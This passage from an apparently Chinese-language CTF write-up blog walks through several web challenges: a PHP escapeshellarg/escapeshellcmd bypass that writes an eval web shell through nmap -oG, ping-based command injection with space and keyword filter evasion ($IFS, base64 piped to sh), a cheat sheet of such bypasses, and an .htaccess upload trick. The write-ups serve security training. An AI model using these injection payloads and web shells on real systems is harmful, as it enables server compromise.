class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> $arg ) : <span class="keyword">string</span></span><br></pre></td></tr></table></div></figure><p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 <span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.exec.php">exec()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>, <span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.system.php">system()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> <span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要被转码的参数    arg  </span><br><span class="line">返回值            转换之后字符串</span><br></pre></td></tr></table></div></figure><p><strong>范例</strong></p><p><strong>示例 #1 escapeshellarg() 的例子</strong></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#x27; -v -d a=1</span></span><br><span class="line"><span class="string">escapeshellarg转义后：</span></span><br><span class="line"><span class="string">2. &#x27;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#x27;\&#x27;&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">//有单引号会先在单引号前添加\然后两边加&#x27;</span><span class="string">&#x27;,最后整个语句再加&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">escapeshellcmd转义后</span></span><br><span class="line"><span class="string">3. &#x27;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&#x27;\\&#x27;</span><span class="string">&#x27; -v -d a=1\&#x27;</span></span><br></pre></td></tr></table></div></figure><p><span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.escapeshellarg.php">官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="2-4-escapeshellcmd函数">          <a href="#2-4-escapeshellcmd函数" class="heading-link"><i class="fas fa-link"></i></a>2.4 escapeshellcmd函数</h3>      <p>escapeshellcmd — shell 元字符转义</p><p><strong>说明</strong></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellcmd ( <span class="keyword">string</span> $command ) : <span class="keyword">string</span></span><br></pre></td></tr></table></div></figure><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.exec.php">exec()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 或 <span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.system.php">system()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数，或者 <span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 之前进行转义。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反斜线（\）会在以下字符之前插入： &amp;#;&#96;|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。 &#39; 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">要被转义的参数命令        command</span><br><span class="line">转义后的字符串           返回值</span><br></pre></td></tr></table></div></figure><p><strong>范例</strong></p><p><strong>示例 #1 escapeshellcmd() example</strong></p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 我们故意允许任意数量的参数$command = &#x27;./configure &#x27;.$_POST[&#x27;configure_options&#x27;];$escaped_command = escapeshellcmd($command); system($escaped_command);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></div></figure><p><strong>警告：</strong>escapeshellcmd()应被用在完整的命令字符串上。 即使如此，攻击者还是可以传入任意数量的参数。 请使用 <span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.escapeshellarg.php">escapeshellarg()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数 对单个参数进行转义。</p><p>对于单个单引号, <strong>escapeshellarg</strong> 函数转义后,还会在左右各加一个单引号,但 <strong>escapeshellcmd</strong> 函数是直接加一个转义符，对于成对的单引号, <strong>escapeshellcmd</strong> 函数默认不转义,但 <strong>escapeshellarg</strong> 函数转义</p><p><span class="exturl"><a class="exturl__link" href="https://www.php.net/manual/zh/function.escapeshellcmd.php">官方文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">参考文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="3-解析">          <a href="#3-解析" class="heading-link"><i class="fas fa-link"></i></a>3. 解析</h2>              <h3 id="3-1-第一步-取地址">          <a href="#3-1-第一步-取地址" class="heading-link"><i class="fas fa-link"></i></a>3.1 第一步 取地址</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>为了取浏览器当前用户的真实IP，使得使用PHP的 <code>$_SERVER[&quot;REMOTE_ADDR&quot;] </code>一致取得客户端的 真实IP地址。</p>        <h3 id="3-2-第二步-转义">          <a href="#3-2-第二步-转义" class="heading-link"><i class="fas fa-link"></i></a>3.2 第二步 转义</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];      <span class="comment">//get方式上传host参数</span></span><br><span class="line">    $host = escapeshellarg($host);    <span class="comment">//参数host为要转义后的字符串</span></span><br><span class="line">    $host = escapeshellcmd($host);    <span class="comment">//参数host为要转义后的字符串</span></span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);<span class="comment">//IP和&quot;glzjin&quot;一起进行MD5加密放入沙箱中</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);<span class="comment">//system执行nmap命令</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>尝试利用</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;7ba8fb22-21fa-4faf-9a17-0fbb2d258599.node3.buuoj.cn&#x2F;?host&#x3D;127.0.0.1</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/BUUCTF-2018-Online-Tool/3.2.1.png"></p><p>所以nmap是扫描host的内容，我们要利用host,将查询flag的语句cat /flag添加到host中</p>        <h3 id="3-2-构造payload">          <a href="#3-2-构造payload" class="heading-link"><i class="fas fa-link"></i></a>3.2 构造payload</h3>      <p>nmap有一个参数-oG可以实现将命令和结果写到文件；所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接，也可以直接命令 cat flag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#96;cat &#x2F;flag&#96;;?&gt; -oG test.php</span><br></pre></td></tr></table></div></figure><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span></span><br><span class="line">或者：?host=<span class="string">&#x27; &lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#x27;</span></span><br><span class="line"><span class="comment">//因为‘’会被转义，所以用``</span></span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">蚁剑连接：</span><br><span class="line">http:&#x2F;&#x2F;be3b8a7a-eb16-4977-8512-b05cbecb5b10.node3.buuoj.cn&#x2F;8241e8c62b209d7c6a3780dca41553a2&#x2F;shell.php</span><br></pre></td></tr></table></div></figure><p><img src="/2021/02/08/BUUCTF-2018-Online-Tool/3.2.2.png"></p><p><img src="/2021/02/08/BUUCTF-2018-Online-Tool/3.2.3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019-PingPingPing</title>
      <link href="2021/02/08/GXYCTF2019-PingPingPing/"/>
      <url>2021/02/08/GXYCTF2019-PingPingPing/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="GXYCTF2019-Ping-Ping-Ping">          <a href="#GXYCTF2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a>[GXYCTF2019]Ping Ping Ping</h1>      <p><img src="/2021/02/08/GXYCTF2019-PingPingPing/0.jpg"></p><a id="more"></a><p>页面显示这样，先试着 ping 127.0.0.1,ping 的通，是 linux 命令执行<br>尝试 执行其他命令：/？ip=127.0.0.1;ls 页面显示</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></div></figure><p>?ip=127.0.0.1 ;cat flag.php，提示：/?ip= fxck your space!（检查你的空间）<br>可能又是什么被过滤了<br>首先判断是空格被过滤了，尝试命令：?ip=127.0.0.1 ;cat${IFS}$1flag.php，提示 fix your symbol(检<br>查你的符合)，不行，几种尝试后，发现 $IFS$1和IFS可以绕过空格过滤，然后提示：fix your flag，那<br>差不多flag 也被过滤了<br>它还有一个 index.php ，我们打开看看有什么 /?ip=127.0.0.1;cat$IFS$1index.php<br>发现就是php后台过滤flag 的详情</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\</span></span><br><span class="line"><span class="string">&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string"> &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string"> &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string"> &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string"> echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string"> print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>然后把上面除了反斜杠的绕过方式，其他的都试了一遍，发现以下三种情况可以绕过过滤，得到flag</p>        <h2 id="1-拼接">          <a href="#1-拼接" class="heading-link"><i class="fas fa-link"></i></a>1. 拼接</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;f;b&#x3D;l;c&#x3D;g;d&#x3D;a;cat$IFS$1$a$b$d$c.php，F12查看源码得到 flag</span><br></pre></td></tr></table></div></figure>        <h2 id="2-内联">          <a href="#2-内联" class="heading-link"><i class="fas fa-link"></i></a>2. 内联</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$1 ls （ls左右有&#96;&#96;内联符号）F12查看源码得到 flag</span><br></pre></td></tr></table></div></figure>        <h2 id="3-base64编码">          <a href="#3-base64编码" class="heading-link"><i class="fas fa-link"></i></a>3. base64编码</h2>      <p><img src="/2021/02/08/GXYCTF2019-PingPingPing/0.jpg"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh(bash的情况不行)，F12查</span><br><span class="line">看源码得到 flag</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020-新生赛-Exec1</title>
      <link href="2021/02/08/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec1/"/>
      <url>2021/02/08/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/2021/02/08/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec1/0.png"></p><a id="more"></a><p>ping ip 可以直接拿到</p><p>127.0.0.1;cat /ﬂag 拿到ﬂag</p><p>对于这个未加过滤的题目可以利用常见的管道符进行执行命令</p>        <h2 id="1-Windows系统支持的管道符">          <a href="#1-Windows系统支持的管道符" class="heading-link"><i class="fas fa-link"></i></a>1. Windows系统支持的管道符</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、|（就是按位或），直接执行|后面的语句</span><br><span class="line">2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></div></figure>        <h2 id="2-Linux系统支持的管道符">          <a href="#2-Linux系统支持的管道符" class="heading-link"><i class="fas fa-link"></i></a>2. Linux系统支持的管道符</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|、||、&amp;、&amp;&amp; 这四种管道符都存在且用法和Windows 系统下一样，多了一个; 管道符，作用和&amp; 一样</span><br></pre></td></tr></table></div></figure>        <h2 id="3-空格过滤">          <a href="#3-空格过滤" class="heading-link"><i class="fas fa-link"></i></a>3. 空格过滤</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125; ， $&#123;IFS&#125;$1 ， $IFS$1 ，这些就可以加在 cat ﬂag 之间</span><br></pre></td></tr></table></div></figure>        <h2 id="4-重定向符-lt-gt">          <a href="#4-重定向符-lt-gt" class="heading-link"><i class="fas fa-link"></i></a>4. 重定向符&lt;&gt;</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;ﬂag ，cat&lt;ﬂag</span><br></pre></td></tr></table></div></figure>        <h2 id="5-09-需要php环境">          <a href="#5-09-需要php环境" class="heading-link"><i class="fas fa-link"></i></a>5. %09(需要php环境)</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例 如 ：cat%09&#x2F;ﬂag </span><br></pre></td></tr></table></div></figure>        <h2 id="6-拼接">          <a href="#6-拼接" class="heading-link"><i class="fas fa-link"></i></a>6. 拼接</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;ﬂ;d&#x3D;ag;$a$b $c$d</span><br></pre></td></tr></table></div></figure>        <h2 id="7-base64编码">          <a href="#7-base64编码" class="heading-link"><i class="fas fa-link"></i></a>7. base64编码</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d (Y2F0IGZsYWc&#x3D;是cat ﬂag的64编码形式)</span><br><span class="line">或者：echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash</span><br></pre></td></tr></table></div></figure>        <h2 id="8-单引号，双引号">          <a href="#8-单引号，双引号" class="heading-link"><i class="fas fa-link"></i></a>8. 单引号，双引号</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at ﬂ&#39;&#39;ag</span><br></pre></td></tr></table></div></figure>        <h2 id="9-反斜线">          <a href="#9-反斜线" class="heading-link"><i class="fas fa-link"></i></a>9. 反斜线</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at ﬂ\ag</span><br></pre></td></tr></table></div></figure>        <h2 id="10-1、-2等和">          <a href="#10-1、-2等和" class="heading-link"><i class="fas fa-link"></i></a>10. $1、$2等和$@</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c$1at ﬂ$@ag</span><br></pre></td></tr></table></div></figure>        <h2 id="11-读文件绕过">          <a href="#11-读文件绕过" class="heading-link"><i class="fas fa-link"></i></a>11. 读文件绕过</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">当cat被过滤时，可以使用如下命令代替</span><br><span class="line">1.more:一页一页的显示档案内容</span><br><span class="line">2.less:与 more 类似，但是比more更好的是，它可以[pg dn][pg up]翻页</span><br><span class="line">3.head:查看头几行</span><br><span class="line">4.tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">5.tail:查看尾几行</span><br><span class="line">6.nl:显示的时候，顺便输入行号</span><br><span class="line">7.od:以二进制的方式读取档案内容</span><br><span class="line">8.vi&#x2F;vim:一种编辑器,也可以查看文档内容</span><br><span class="line">9.sort:可以查看</span><br><span class="line">10.uniq:可以查看</span><br><span class="line">11.file -f:报错出具体内容</span><br></pre></td></tr></table></div></figure>        <h2 id="12-内敛执行绕过">          <a href="#12-内敛执行绕过" class="heading-link"><i class="fas fa-link"></i></a>12. 内敛执行绕过</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;,$ 都可以添加命令（在前面一个符合之间，在后面一个符合之后添加什么 cat flag 的命令）</span><br></pre></td></tr></table></div></figure>        <h2 id="13-Linux中的-gt-符号和-gt-gt-符号">          <a href="#13-Linux中的-gt-符号和-gt-gt-符号" class="heading-link"><i class="fas fa-link"></i></a>13. Linux中的&gt;符号和&gt;&gt;符号</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过&gt; 将命令结果存入文件中</span><br><span class="line">使用&gt; 命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建该文件再存入</span><br><span class="line">例如：linux 命令行：echo &quot;cat flag&quot;&gt;flag.txt ；这样cat flag.txt 存入 cat flag这个命令，；利用 sh</span><br><span class="line">flag 就可以执行命令得到flag 了</span><br><span class="line">&gt;&gt; 符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span><br></pre></td></tr></table></div></figure>        <h2 id="14-Linux中命令换行：">          <a href="#14-Linux中命令换行：" class="heading-link"><i class="fas fa-link"></i></a>14. Linux中命令换行：</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用 \ 换行符，可以在命令之间添加这个换行符，把要执行的命令换到下一行，这样就可以在某些有</span><br><span class="line">长度限制命令的时候可以将命令一条条输入到一个文本中然后执行命令了。</span><br><span class="line">例如： echo &quot;ca\\&quot;&gt;flag , echo &quot;t\\&quot;&gt;flag , echo &quot;fl\\&quot;&gt;flag&#96;&#96;echo &quot;ag\\&quot;&gt;flag</span><br><span class="line">这样再 sh flag 就可以得到flag 了</span><br></pre></td></tr></table></div></figure>        <h2 id="15-利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过">          <a href="#15-利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="heading-link"><i class="fas fa-link"></i></a>15. 利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在linux 中，我们使用ls -t 命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</span><br><span class="line">就可以如下依次在 linux 命令行中执行：</span><br><span class="line">&gt;&quot;ag&quot;</span><br><span class="line">&gt;&quot;fl\\&quot;</span><br><span class="line">&gt;&quot;t\\&quot;</span><br><span class="line">&gt;&quot;ca\\&quot;</span><br><span class="line">ls -t &gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[MRCTF2020]你传你马呢</title>
      <link href="2021/02/06/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/"/>
      <url>2021/02/06/MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%E9%A9%AC%E5%91%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-htaccess文件简介">          <a href="#1-htaccess文件简介" class="heading-link"><i class="fas fa-link"></i></a>1. .htaccess文件简介</h2>      <p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，；即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，<br>以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>打开apache的http.conf文件</p><a id="more"></a><p> 找到的AllowOverride None，将其改为AllowOverride All</p><p>打开.htaccess文件写入</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></div></figure><p>这语句的作用是让Apache将其他类型文件均以php格式解析</p>        <h2 id="2-htaccess的利用">          <a href="#2-htaccess的利用" class="heading-link"><i class="fas fa-link"></i></a>2. .htaccess的利用</h2>              <h3 id="2-1-包含解析">          <a href="#2-1-包含解析" class="heading-link"><i class="fas fa-link"></i></a>2.1 包含解析</h3>      <p>例如：</p><p>下面是只要要包含bbb的文件，都会被当成php代码执行</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;bbb&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilseMatch&gt;</span><br></pre></td></tr></table></div></figure>        <h3 id="2-2-特定文件解析">          <a href="#2-2-特定文件解析" class="heading-link"><i class="fas fa-link"></i></a>2.2 特定文件解析</h3>      <p>下面这种方法时，后面的.png文件能被当成php代码执行，如果想换成别的改扩展名就可以</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br></pre></td></tr></table></div></figure>        <h2 id="3-赛题">          <a href="#3-赛题" class="heading-link"><i class="fas fa-link"></i></a>3. 赛题</h2>              <h3 id="3-1-思路">          <a href="#3-1-思路" class="heading-link"><i class="fas fa-link"></i></a>3.1 思路</h3>      <p>先将.htaccess文件上传时，抓包，然后改Content-Type的类型为  image/jpeg的形式上传，当然这道题，image/png的文件类型也可以上传，为了让该目录下的其他类型文件均以php格式解析；</p><p>然后，上传木马图片；</p><p>最后用蚁剑连接。</p>        <h3 id="3-2-过程">          <a href="#3-2-过程" class="heading-link"><i class="fas fa-link"></i></a>3.2 过程</h3>              <h4 id="3-2-1-上传-htaccess文件">          <a href="#3-2-1-上传-htaccess文件" class="heading-link"><i class="fas fa-link"></i></a>3.2.1 上传.htaccess文件</h4>      <p>将.htaccess文件写入：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></div></figure><p>上传.htaccess文件</p><p>把Content-type改成image/jpeg类型</p><p><img 